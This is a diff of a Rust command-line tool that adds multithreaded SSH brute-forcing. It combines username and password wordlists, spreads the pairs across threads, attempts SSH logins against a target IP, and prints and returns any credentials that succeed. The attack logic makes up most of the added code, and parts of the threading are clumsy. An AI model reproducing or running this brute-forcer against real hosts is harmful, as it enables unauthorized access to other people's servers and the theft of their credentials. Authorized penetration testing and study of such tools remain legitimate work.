@@ -3,11 +3,11 @@ use osshkeys::{KeyPair, cipher::Cipher, KeyType};
 use ssh_rs::ssh;
 use console::style;
 use types::*;
-// use crossbeam::channel::{Sender, Receiver, unbounded};
-// use std::{
-//   thread,
-//   thread::JoinHandle,
-// };
+use crossbeam::channel::{Sender, Receiver, unbounded};
+use std::{
+  thread,
+  thread::JoinHandle, time::Duration,
+};
 
 #[derive(Debug, Clone, Parser)]
 #[clap(author, version, about)]
@@ -210,10 +210,182 @@ impl Arguments {
     }
 
     else {
+      
+      let users: Vec<&str> = usr_content.split(u_ln).collect();
+      let passwords: Vec<&str> = pwr_content.split(p_ln).collect();
+      let mut userpass: Vec<String> = Default::default();
+      let key_info = KeyInfo { bits: bits.clone(), algo: algo.clone(), ip: ip.clone() };
 
+      for i in users {
+        for idx in passwords.clone() {
+          userpass.push(format!("{i}:{idx}"));
+        }
+      }
+
+      let items = userpass.len();
+      let thread_chunk_sz = items/threads as usize;
+      let remainder = items as f64 % threads as f64;
+      let mut handles: Vec<JoinHandle<()>> = Default::default();
+
+      println!("items: {}\nthread_chunk_size: {}\nremainder: {}\n {threads}",
+      style(items).cyan(), style(thread_chunk_sz).cyan(), style(remainder).cyan());
+    
+      let (tx_msg, rx_msg) = unbounded::<ThreadMessage>();
+      let (tx_out, rx_out) = unbounded::<KeyOutput>();
+      let mut th_data_ch: Vec<String> = Default::default();
+      let mut ch_counter: usize = 0;
+      
+      for i in 0..userpass.len()+1 {
+        let th_msg_sender = tx_msg.clone();
+        let th_out_sender = tx_out.clone();
+        let th_key_info = key_info.clone();
+
+        let cip = self.ip_port.clone();
+        let cusr_filename = user_filename.clone();
+        let cpwr_filename = pass_filename.clone();
+
+        if ch_counter+1 > thread_chunk_sz {
+          let c_data = th_data_ch.clone();
+          
+          // Brute force private key login.
+          // Call thread function and userpass chunk to thread.
+          handles.push(thread::spawn(move || {
+            let th_msg_s = th_msg_sender.clone();
+            let th_out_s = th_out_sender.clone();
+            let th_data_chk = c_data.len();
+            let th_ip = cip.clone();
+            println!("thread_chunk {th_data_chk}\nthread_chk_data: {:?}", c_data);
+
+            if let Some(buffer) = Self::thread_populate_buffer(th_msg_s.clone(), c_data, &th_key_info) {
+              let output = KeyOutput {
+                algorithim: format!("{:?}", algo),
+                bits: bits.clone(),
+                cipher: format!("{:?}", cipher),
+                ip: th_ip,
+                pwr_wordlist: cpwr_filename,
+                usr_wordlist: cusr_filename,
+                time: String::from("None for now"),
+                data: buffer,
+              };
+
+              match th_msg_s.send(ThreadMessage::Data) {
+                Ok(_) => {
+                  if let Err(e) = th_out_s.send(output) {
+                    println!("{}: unable to send keydata to main thread - {}", style("Error").red().bright(), style(e).cyan());
+                  }
+
+                  else {
+                    println!("{}: Successfully sent keydata to main thread", style("OK").yellow().bright());
+                  }
+                },
+
+                Err(e) => {}
+              }
+            }
+          }));
+          
+          ch_counter = 0;
+          th_data_ch.clear();
+        }
+
+        if let Some(index) = userpass.get(i) {
+          th_data_ch.push(index.to_string());
+        }
+
+        ch_counter += 1;
+      }
+
+      let mut handle_count: usize = 1;
+      std::thread::sleep(Duration::from_millis(500));
+      let mut wait_counter: usize = 0;
+
+      loop {
+        if wait_counter >= 10 {
+          break;
+        }
+        
+        let crx_msg = rx_msg.clone();
+        let crx_out = rx_out.clone();
+
+        if let Ok(v) = crx_msg.recv() {
+          
+          match v {
+            ThreadMessage::Data => {
+              println!("{} => Ready to receive key", style("Debug").red().bright());
+
+              if let Ok(s) = crx_out.recv() {
+                println!("{}: keydata received", style("OK").yellow().bright());
+                out = s;
+              }
+            }
+
+            ThreadMessage::Waiting => {}
+          }
+        }
+
+        else {
+          println!("wait_counter: {wait_counter}");
+          wait_counter += 1;
+          thread::sleep(Duration::from_millis(500));
+        }
+      }
+      
+      for i in handles {
+        if let Ok(handle) = i.join() {
+          println!("handles joined: {handle_count}");
+          handle_count += 1;
+        }
+      }
     }
 
     out
+  }
+
+  pub fn thread_populate_buffer(s_msg: Sender<ThreadMessage>, data: Vec<String>, info: &KeyInfo) -> Option<PrivateKeyData> {
+    let c_data = data.clone();
+    let key_type = info.algo;
+    let bits = info.bits;
+    let ip = String::from(info.ip.as_str());
+
+    for i in c_data {
+      let pair: Vec<&str> = i.split(":").collect();
+      let username = pair[0];
+      let password = pair[1];
+      let mut key = String::from("");
+
+      if let Ok(k) = Self::encrypt_pass_to_key(password, bits, key_type) {
+        key.push_str(k.as_str());
+      }
+
+      let session = ssh::create_session()
+      .username(username).password(password).private_key(key.clone()).connect(ip.clone());
+
+      match session {
+        Ok(s) => {
+          s.close();
+
+          println!("{}: {} {}@{} with password '{}'",
+          style("OK").yellow().bright(), style("Successfully connected").green().bright(),
+          style(username.clone()).cyan(), style(ip.clone()).cyan(), style(password.clone()).cyan());
+          
+          return Some(PrivateKeyData {
+            user: String::from(username),
+            password: String::from(password),
+            private_key: key,
+          });
+        },
+
+        Err(e) => {
+          // debug messages go here --->
+
+          if let Err(e) = s_msg.send(ThreadMessage::Waiting) {
+
+          }
+        }
+      }
+    }
+
+    None
   }
 
   // Write the FileInputOutput buffer content to a json file.
@@ -286,12 +458,20 @@ impl Arguments {
 }
 
 pub mod types {
+  use osshkeys::{cipher::Cipher, KeyType};
   use serde::Serialize;
   use clap;
 
   pub const LF: &str = "\n";
   pub const CRLF: &str = "\r\n";  
 
+  #[derive(Debug, Clone)]
+  pub struct KeyInfo {
+    pub ip: String,
+    pub bits: usize,
+    pub algo: KeyType
+  }
+  
   #[derive(Debug, Clone)]
   pub enum LineEndings {
     LR,
@@ -307,7 +487,6 @@ pub mod types {
   }
   
   #[derive(Debug, Clone)]
-  #[allow(dead_code)]
   pub enum ThreadMessage {
     Data,
     Waiting,
